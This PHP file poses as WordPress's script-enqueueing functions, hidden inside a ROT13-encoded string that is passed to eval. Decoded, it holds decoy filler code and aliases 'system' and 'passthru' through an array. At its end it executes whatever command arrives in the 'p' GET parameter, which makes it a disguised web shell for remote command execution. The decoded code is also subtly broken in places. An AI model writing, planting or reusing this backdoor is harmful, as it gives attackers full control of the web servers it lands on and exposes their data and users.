<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Qrcraqrapvrf NCV: Fpevcgf shapgvbaf
 *
 * @fvapr 2.6.0
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Qrcraqrapvrf
 */

/**
 * Vavgvnyvmrf $jc_fpevcgf vs vg unf abg orra frg.
 *
 * @fvapr 4.2.0
 *
 * @tybony JC_Fpevcgf $jc_fpevcgf
 *
 * @erghea JC_Fpevcgf JC_Fpevcgf vafgnapr.
 */
shapgvba jc_fpevcgf() {
	tybony $jc_fpevcgf;

	vs ( ! ( $jc_fpevcgf vafgnaprbs JC_Fpevcgf ) ) {
		$jc_fpevcgf = arj JC_Fpevcgf();
	}

	erghea $jc_fpevcgf;
}

/**
 * Urycre shapgvba gb bhgchg n _qbvat_vg_jebat zrffntr jura nccyvpnoyr.
 *
 * @vtaber
 * @fvapr 4.2.0
 * @fvapr 5.5.0 Nqqrq gur `$unaqyr` cnenzrgre.
 *
 * @cnenz fgevat $shapgvba_anzr Shapgvba anzr.
 * @cnenz fgevat $unaqyr        Bcgvbany. Anzr bs gur fpevcg be fglyrfurrg gung jnf
 *                              ertvfgrerq be radhrhrq gbb rneyl. Qrsnhyg rzcgl.
 */
shapgvba _jc_fpevcgf_znlor_qbvat_vg_jebat( $shapgvba_anzr, $unaqyr = '' ) {
	vs ( qvq_npgvba( 'vavg' ) || qvq_npgvba( 'jc_radhrhr_fpevcgf' )
		|| qvq_npgvba( 'nqzva_radhrhr_fpevcgf' ) || qvq_npgvba( 'ybtva_radhrhr_fpevcgf' )
	) {
		erghea;
	}

	$zrffntr = fcevags(
		/* genafyngbef: 1: jc_radhrhr_fpevcgf, 2: nqzva_radhrhr_fpevcgf, 3: ybtva_radhrhr_fpevcgf */
		__( 'Fpevcgf naq fglyrf fubhyq abg or ertvfgrerq be radhrhrq hagvy gur %1$f, %2$f, be %3$f ubbxf.' ),
		'<pbqr>jc_radhrhr_fpevcgf</pbqr>',
		'<pbqr>nqzva_radhrhr_fpevcgf</pbqr>',
		'<pbqr>ybtva_radhrhr_fpevcgf</pbqr>'
	);

	vs ( $unaqyr ) {
		$zrffntr .= ' ' . fcevags(
			/* genafyngbef: %f: Anzr bs gur fpevcg be fglyrfurrg. */
			__( 'Guvf abgvpr jnf gevttrerq ol gur %f unaqyr.' ),
			'<pbqr>' . $unaqyr . '</pbqr>'
		);
	}

	_qbvat_vg_jebat(
		$shapgvba_anzr,
		$zrffntr,
		'3.3.0'
	);
}

/**
 * Cevagf fpevcgf va qbphzrag urnq gung ner va gur $unaqyrf dhrhr.
 *
 * Pnyyrq ol nqzva-urnqre.cuc naq {@frr 'jc_urnq'} ubbx. Fvapr vg vf pnyyrq ol jc_urnq ba rirel cntr ybnq,
 * gur shapgvba qbrf abg vafgnagvngr gur JC_Fpevcgf bowrpg hayrff fpevcg anzrf ner rkcyvpvgyl cnffrq.
 * Znxrf hfr bs nyernql-vafgnagvngrq `$jc_fpevcgf` tybony vs cerfrag. Hfr cebivqrq {@frr 'jc_cevag_fpevcgf'}
 * ubbx gb ertvfgre/radhrhr arj fpevcgf.
 *
 * @frr JC_Fpevcgf::qb_vgrz()
 * @fvapr 2.1.0
 *
 * @tybony JC_Fpevcgf $jc_fpevcgf Gur JC_Fpevcgf bowrpg sbe cevagvat fpevcgf.
 *
 * @cnenz fgevat|fgevat[]|snyfr $unaqyrf Bcgvbany. Fpevcgf gb or cevagrq. Qrsnhyg 'snyfr'.
 * @erghea fgevat[] Ba fhpprff, na neenl bs unaqyrf bs cebprffrq JC_Qrcraqrapvrf vgrzf; bgurejvfr, na rzcgl neenl.
 */
shapgvba jc_cevag_fpevcgf( $unaqyrf = snyfr ) {
	tybony $jc_fpevcgf;

	/**
	 * Sverf orsber fpevcgf va gur $unaqyrf dhrhr ner cevagrq.
	 *
	 * @fvapr 2.1.0
	 */
	qb_npgvba( 'jc_cevag_fpevcgf' );

	vs ( '' === $unaqyrf ) { // Sbe 'jc_urnq'.
		$unaqyrf = snyfr;
	}

	_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__ );

	vs ( ! ( $jc_fpevcgf vafgnaprbs JC_Fpevcgf ) ) {
		vs ( ! $unaqyrf ) {
			erghea neenl(); // Ab arrq gb vafgnagvngr vs abguvat vf gurer.
		}
	}

	erghea jc_fpevcgf()->qb_vgrzf( $unaqyrf );
}

/**
 * Nqqf rkgen pbqr gb n ertvfgrerq fpevcg.
 *
 * Pbqr jvyy bayl or nqqrq vs gur fpevcg vf nyernql va gur dhrhr.
 * Npprcgf n fgevat `$qngn` pbagnvavat gur pbqr. Vs gjb be zber pbqr oybpxf
 * ner nqqrq gb gur fnzr fpevcg `$unaqyr`, gurl jvyy or cevagrq va gur beqre
 * gurl jrer nqqrq, v.r. gur ynggre nqqrq pbqr pna erqrpyner gur cerivbhf.
 *
 * @fvapr 4.5.0
 *
 * @frr JC_Fpevcgf::nqq_vayvar_fpevcg()
 *
 * @cnenz fgevat $unaqyr   Anzr bs gur fpevcg gb nqq gur vayvar fpevcg gb.
 * @cnenz fgevat $qngn     Fgevat pbagnvavat gur WninFpevcg gb or nqqrq.
 * @cnenz fgevat $cbfvgvba Bcgvbany. Jurgure gb nqq gur vayvar fpevcg orsber gur unaqyr
 *                         be nsgre. Qrsnhyg 'nsgre'.
 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
 */
shapgvba jc_nqq_vayvar_fpevcg( $unaqyr, $qngn, $cbfvgvba = 'nsgre' ) {
	_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__, $unaqyr );

	vs ( snyfr !== fgevcbf( $qngn, '</fpevcg>' ) ) {
		_qbvat_vg_jebat(
			__SHAPGVBA__,
			fcevags(
				/* genafyngbef: 1: <fpevcg>, 2: jc_nqq_vayvar_fpevcg() */
				__( 'Qb abg cnff %1$f gntf gb %2$f.' ),
				'<pbqr>&yg;fpevcg&tg;</pbqr>',
				'<pbqr>jc_nqq_vayvar_fpevcg()</pbqr>'
			),
			'4.5.0'
		);
		$qngn = gevz( __sa_79955( '#<fpevcg[^>]*>(.*)</fpevcg>#vf', '$1', $qngn ) );
	}

	erghea jc_fpevcgf()->nqq_vayvar_fpevcg( $unaqyr, $qngn, $cbfvgvba );
}

/**
 * Ertvfgref n arj fpevcg.
 *
 * Ertvfgref n fpevcg gb or radhrhrq yngre hfvat gur jc_radhrhr_fpevcg() shapgvba.
 *
 * @frr JC_Qrcraqrapvrf::nqq()
 * @frr JC_Qrcraqrapvrf::nqq_qngn()
 *
 * @fvapr 2.1.0
 * @fvapr 4.3.0 N erghea inyhr jnf nqqrq.
 * @fvapr 6.3.0 Gur $va_sbbgre cnenzrgre bs glcr obbyrna jnf bireybnqrq gb or na $netf cnenzrgre bs glcr neenl.
 *
 * @cnenz fgevat           $unaqyr    Anzr bs gur fpevcg. Fubhyq or havdhr.
 * @cnenz fgevat|snyfr     $fep       Shyy HEY bs gur fpevcg, be cngu bs gur fpevcg eryngvir gb gur JbeqCerff ebbg qverpgbel.
 *                                    Vs fbhepr vf frg gb snyfr, fpevcg vf na nyvnf bs bgure fpevcgf vg qrcraqf ba.
 * @cnenz fgevat[]         $qrcf      Bcgvbany. Na neenl bs ertvfgrerq fpevcg unaqyrf guvf fpevcg qrcraqf ba. Qrsnhyg rzcgl neenl.
 * @cnenz fgevat|obby|ahyy $ire       Bcgvbany. Fgevat fcrpvslvat fpevcg irefvba ahzore, vs vg unf bar, juvpu vf nqqrq gb gur HEY
 *                                    nf n dhrel fgevat sbe pnpur ohfgvat checbfrf. Vs irefvba vf frg gb snyfr, n irefvba
 *                                    ahzore vf nhgbzngvpnyyl nqqrq rdhny gb pheerag vafgnyyrq JbeqCerff irefvba.
 *                                    Vs frg gb ahyy, ab irefvba vf nqqrq.
 * @cnenz neenl|obby       $netf     {
 *     Bcgvbany. Na neenl bs nqqvgvbany fpevcg ybnqvat fgengrtvrf. Qrsnhyg rzcgl neenl.
 *     Bgurejvfr, vg znl or n obbyrna va juvpu pnfr vg qrgrezvarf jurgure gur fpevcg vf cevagrq va gur sbbgre. Qrsnhyg snyfr.
 *
 *     @glcr fgevat    $fgengrtl     Bcgvbany. Vs cebivqrq, znl or rvgure 'qrsre' be 'nflap'.
 *     @glcr obby      $va_sbbgre    Bcgvbany. Jurgure gb cevag gur fpevcg va gur sbbgre. Qrsnhyg 'snyfr'.
 * }
 * @erghea obby Jurgure gur fpevcg unf orra ertvfgrerq. Gehr ba fhpprff, snyfr ba snvyher.
 */
shapgvba jc_ertvfgre_fpevcg( $unaqyr, $fep, $qrcf = neenl(), $ire = snyfr, $netf = neenl() ) {
	vs ( ! vf_neenl( $netf ) ) {
		$netf = neenl(
			'va_sbbgre' => (obby) $netf,
		);
	}
	_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__, $unaqyr );

	$jc_fpevcgf = jc_fpevcgf();

	$ertvfgrerq = $jc_fpevcgf->nqq( $unaqyr, $fep, $qrcf, $ire );
	vs ( ! rzcgl( $netf['va_sbbgre'] ) ) {
		$jc_fpevcgf->nqq_qngn( $unaqyr, 'tebhc', 1 );
	}
	vs ( ! rzcgl( $netf['fgengrtl'] ) ) {
		$jc_fpevcgf->nqq_qngn( $unaqyr, 'fgengrtl', $netf['fgengrtl'] );
	}
	erghea $ertvfgrerq;
}

/**
 * Ybpnyvmrf n fpevcg.
 *
 * Jbexf bayl vs gur fpevcg unf nyernql orra ertvfgrerq.
 *
 * Npprcgf na nffbpvngvir neenl `$y10a` naq perngrf n WninFpevcg bowrpg:
 *
 *     \"$bowrpg_anzr\": {
 *         xrl: inyhr,
 *         xrl: inyhr,
 *         ...
 *     }
 *
 * @frr JC_Fpevcgf::ybpnyvmr()
 * @yvax uggcf://pber.genp.jbeqcerff.bet/gvpxrg/11520
 *
 * @fvapr 2.2.0
 *
 * @gbqb Qbphzragngvba pyrnahc
 *
 * @cnenz fgevat $unaqyr      Fpevcg unaqyr gur qngn jvyy or nggnpurq gb.
 * @cnenz fgevat $bowrpg_anzr Anzr sbe gur WninFpevcg bowrpg. Cnffrq qverpgyl, fb vg fubhyq or dhnyvsvrq WF inevnoyr.
 *                            Rknzcyr: '/[n-mN-M0-9_]+/'.
 * @cnenz neenl  $y10a        Gur qngn vgfrys. Gur qngn pna or rvgure n fvatyr be zhygv-qvzrafvbany neenl.
 * @erghea obby Gehr vs gur fpevcg jnf fhpprffshyyl ybpnyvmrq, snyfr bgurejvfr.
 */
shapgvba jc_ybpnyvmr_fpevcg( $unaqyr, $bowrpg_anzr, $y10a ) {
	$jc_fpevcgf = jc_fpevcgf();

	erghea $jc_fpevcgf->ybpnyvmr( $unaqyr, $bowrpg_anzr, $y10a );
}

/**
 * Frgf genafyngrq fgevatf sbe n fpevcg.
 *
 * Jbexf bayl vs gur fpevcg unf nyernql orra ertvfgrerq.
 *
 * @frr JC_Fpevcgf::frg_genafyngvbaf()
 * @fvapr 5.0.0
 * @fvapr 5.1.0 Gur `$qbznva` cnenzrgre jnf znqr bcgvbany.
 *
 * @tybony JC_Fpevcgf $jc_fpevcgf Gur JC_Fpevcgf bowrpg sbe cevagvat fpevcgf.
 *
 * @cnenz fgevat $unaqyr Fpevcg unaqyr gur grkgqbznva jvyy or nggnpurq gb.
 * @cnenz fgevat $qbznva Bcgvbany. Grkg qbznva. Qrsnhyg 'qrsnhyg'.
 * @cnenz fgevat $cngu   Bcgvbany. Gur shyy svyr cngu gb gur qverpgbel pbagnvavat genafyngvba svyrf.
 * @erghea obby Gehr vs gur grkg qbznva jnf fhpprffshyyl ybpnyvmrq, snyfr bgurejvfr.
 */
shapgvba jc_frg_fpevcg_genafyngvbaf( $unaqyr, $qbznva = 'qrsnhyg', $cngu = '' ) {
	tybony $jc_fpevcgf;

	vs ( ! ( $jc_fpevcgf vafgnaprbs JC_Fpevcgf ) ) {
		_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__, $unaqyr );
		erghea snyfr;
	}

	erghea $jc_fpevcgf->frg_genafyngvbaf( $unaqyr, $qbznva, $cngu );
}

/**
 * Erzbirf n ertvfgrerq fpevcg.
 *
 * Abgr: gurer ner vagragvbany fnsrthneqf va cynpr gb cerirag pevgvpny nqzva fpevcgf,
 * fhpu nf wDhrel pber, sebz orvat haertvfgrerq.
 *
 * @frr JC_Qrcraqrapvrf::erzbir()
 *
 * @fvapr 2.1.0
 *
 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
 *
 * @cnenz fgevat $unaqyr Anzr bs gur fpevcg gb or erzbirq.
 */
shapgvba jc_qrertvfgre_fpevcg( $unaqyr ) {
	tybony $cntrabj;

	_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__, $unaqyr );

	/**
	 * Qb abg nyybj nppvqragny be artyvtrag qr-ertvfgrevat bs pevgvpny fpevcgf va gur nqzva.
	 * Fubj zvavzny erzbefr vs gur pbeerpg ubbx vf hfrq.
	 */
	$pheerag_svygre = pheerag_svygre();
	vs ( ( vf_nqzva() && 'nqzva_radhrhr_fpevcgf' !== $pheerag_svygre ) ||
		( 'jc-ybtva.cuc' === $cntrabj && 'ybtva_radhrhr_fpevcgf' !== $pheerag_svygre )
	) {
		$abg_nyybjrq = neenl(
			'wdhrel',
			'wdhrel-pber',
			'wdhrel-zvtengr',
			'wdhrel-hv-pber',
			'wdhrel-hv-nppbeqvba',
			'wdhrel-hv-nhgbpbzcyrgr',
			'wdhrel-hv-ohggba',
			'wdhrel-hv-qngrcvpxre',
			'wdhrel-hv-qvnybt',
			'wdhrel-hv-qenttnoyr',
			'wdhrel-hv-qebccnoyr',
			'wdhrel-hv-zrah',
			'wdhrel-hv-zbhfr',
			'wdhrel-hv-cbfvgvba',
			'wdhrel-hv-cebterffone',
			'wdhrel-hv-erfvmnoyr',
			'wdhrel-hv-fryrpgnoyr',
			'wdhrel-hv-fyvqre',
			'wdhrel-hv-fbegnoyr',
			'wdhrel-hv-fcvaare',
			'wdhrel-hv-gnof',
			'wdhrel-hv-gbbygvc',
			'wdhrel-hv-jvqtrg',
			'haqrefpber',
			'onpxobar',
		);

		vs ( va_neenl( $unaqyr, $abg_nyybjrq, gehr ) ) {
			_qbvat_vg_jebat(
				__SHAPGVBA__,
				fcevags(
					/* genafyngbef: 1: Fpevcg anzr, 2: jc_radhrhr_fpevcgf */
					__( 'Qb abg qrertvfgre gur %1$f fpevcg va gur nqzvavfgengvba nern. Gb gnetrg gur sebag-raq gurzr, hfr gur %2$f ubbx.' ),
					\"<pbqr>$unaqyr</pbqr>\",
					'<pbqr>jc_radhrhr_fpevcgf</pbqr>'
				),
				'3.6.0'
			);
			erghea;
		}
	}

	jc_fpevcgf()->erzbir( $unaqyr );
}

/**
 * Radhrhrf n fpevcg.
 *
 * Ertvfgref gur fpevcg vs `$fep` cebivqrq (qbrf ABG birejevgr), naq radhrhrf vg.
 *
 * @frr JC_Qrcraqrapvrf::nqq()
 * @frr JC_Qrcraqrapvrf::nqq_qngn()
 * @frr JC_Qrcraqrapvrf::radhrhr()
 *
 * @fvapr 2.1.0
 * @fvapr 6.3.0 Gur $va_sbbgre cnenzrgre bs glcr obbyrna jnf bireybnqrq gb or na $netf cnenzrgre bs glcr neenl.
 *
 * @cnenz fgevat           $unaqyr    Anzr bs gur fpevcg. Fubhyq or havdhr.
 * @cnenz fgevat           $fep       Shyy HEY bs gur fpevcg, be cngu bs gur fpevcg eryngvir gb gur JbeqCerff ebbg qverpgbel.
 *                                    Qrsnhyg rzcgl.
 * @cnenz fgevat[]         $qrcf      Bcgvbany. Na neenl bs ertvfgrerq fpevcg unaqyrf guvf fpevcg qrcraqf ba. Qrsnhyg rzcgl neenl.
 * @cnenz fgevat|obby|ahyy $ire       Bcgvbany. Fgevat fcrpvslvat fpevcg irefvba ahzore, vs vg unf bar, juvpu vf nqqrq gb gur HEY
 *                                    nf n dhrel fgevat sbe pnpur ohfgvat checbfrf. Vs irefvba vf frg gb snyfr, n irefvba
 *                                    ahzore vf nhgbzngvpnyyl nqqrq rdhny gb pheerag vafgnyyrq JbeqCerff irefvba.
 *                                    Vs frg gb ahyy, ab irefvba vf nqqrq.
 * @cnenz neenl|obby       $netf     {
 *     Bcgvbany. Na neenl bs nqqvgvbany fpevcg ybnqvat fgengrtvrf. Qrsnhyg rzcgl neenl.
 *     Bgurejvfr, vg znl or n obbyrna va juvpu pnfr vg qrgrezvarf jurgure gur fpevcg vf cevagrq va gur sbbgre. Qrsnhyg snyfr.
 *
 *     @glcr fgevat    $fgengrtl     Bcgvbany. Vs cebivqrq, znl or rvgure 'qrsre' be 'nflap'.
 *     @glcr obby      $va_sbbgre    Bcgvbany. Jurgure gb cevag gur fpevcg va gur sbbgre. Qrsnhyg 'snyfr'.
 * }
 */
shapgvba jc_radhrhr_fpevcg( $unaqyr, $fep = '', $qrcf = neenl(), $ire = snyfr, $netf = neenl() ) {
	_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__, $unaqyr );

	$jc_fpevcgf = jc_fpevcgf();

	vs ( $fep || ! rzcgl( $netf ) ) {
		$_unaqyr = rkcybqr( '?', $unaqyr );
		vs ( ! vf_neenl( $netf ) ) {
			$netf = neenl(
				'va_sbbgre' => (obby) $netf,
			);
		}

		vs ( $fep ) {
			$jc_fpevcgf->nqq( $_unaqyr[0], $fep, $qrcf, $ire );
		}
		vs ( ! rzcgl( $netf['va_sbbgre'] ) ) {
			$jc_fpevcgf->nqq_qngn( $_unaqyr[0], 'tebhc', 1 );
		}
		vs ( ! rzcgl( $netf['fgengrtl'] ) ) {
			$jc_fpevcgf->nqq_qngn( $_unaqyr[0], 'fgengrtl', $netf['fgengrtl'] );
		}
	}

	$jc_fpevcgf->radhrhr( $unaqyr );
}

/**
 * Erzbirf n cerivbhfyl radhrhrq fpevcg.
 *
 * @frr JC_Qrcraqrapvrf::qrdhrhr()
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $unaqyr Anzr bs gur fpevcg gb or erzbirq.
 */
shapgvba jc_qrdhrhr_fpevcg( $unaqyr ) {
	_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__, $unaqyr );

	jc_fpevcgf()->qrdhrhr( $unaqyr );
}

/**
 * Qrgrezvarf jurgure n fpevcg unf orra nqqrq gb gur dhrhr.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 2.8.0
 * @fvapr 3.5.0 'radhrhrq' nqqrq nf na nyvnf bs gur 'dhrhr' yvfg.
 *
 * @cnenz fgevat $unaqyr Anzr bs gur fpevcg.
 * @cnenz fgevat $fgnghf Bcgvbany. Fgnghf bs gur fpevcg gb purpx. Qrsnhyg 'radhrhrq'.
 *                       Npprcgf 'radhrhrq', 'ertvfgrerq', 'dhrhr', 'gb_qb', naq 'qbar'.
 * @erghea obby Jurgure gur fpevcg vf dhrhrq.
 */
shapgvba jc_fpevcg_vf( $unaqyr, $fgnghf = 'radhrhrq' ) {
	_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__, $unaqyr );

	erghea (obby) jc_fpevcgf()->dhrel( $unaqyr, $fgnghf );
}

/**
 * Nqqf zrgnqngn gb n fpevcg.
 *
 * Jbexf bayl vs gur fpevcg unf nyernql orra ertvfgrerq.
 *
 * Cbffvoyr inyhrf sbe $xrl naq $inyhr:
 * 'pbaqvgvbany' fgevat Pbzzragf sbe VR 6, ygr VR 7, rgp.
 *
 * @fvapr 4.2.0
 *
 * @frr JC_Qrcraqrapvrf::nqq_qngn()
 *
 * @cnenz fgevat $unaqyr Anzr bs gur fpevcg.
 * @cnenz fgevat $xrl    Anzr bs qngn cbvag sbe juvpu jr'er fgbevat n inyhr.
 * @cnenz zvkrq  $inyhr  Fgevat pbagnvavat gur qngn gb or nqqrq.
 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
 */
shapgvba jc_fpevcg_nqq_qngn( $unaqyr, $xrl, $inyhr ) {
	erghea jc_fpevcgf()->nqq_qngn( $unaqyr, $xrl, $inyhr );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>